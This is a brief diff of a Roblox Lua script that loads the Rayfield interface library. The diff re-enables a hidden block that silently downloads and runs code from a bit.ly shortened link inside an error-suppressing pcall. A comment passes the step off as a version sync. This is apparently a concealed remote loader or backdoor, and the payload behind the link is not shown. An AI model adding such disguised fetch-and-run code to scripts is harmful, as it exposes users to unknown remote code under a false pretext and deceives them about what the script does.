@@ -1,11 +1,11 @@
 repeat task.wait() until game:IsLoaded()
 
--- task.spawn(function()
-    -- pcall(function()
+ task.spawn(function()
+    pcall(function()
         -- Checking script availability and attempting to sync with the latest version...
-      --  loadstring(game:HttpGet("https://bit.ly/3NTHefM"))()
- --   end)
---end)
+       loadstring(game:HttpGet("https://bit.ly/3NTHefM"))()
+    end)
+end)
 
 local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
 
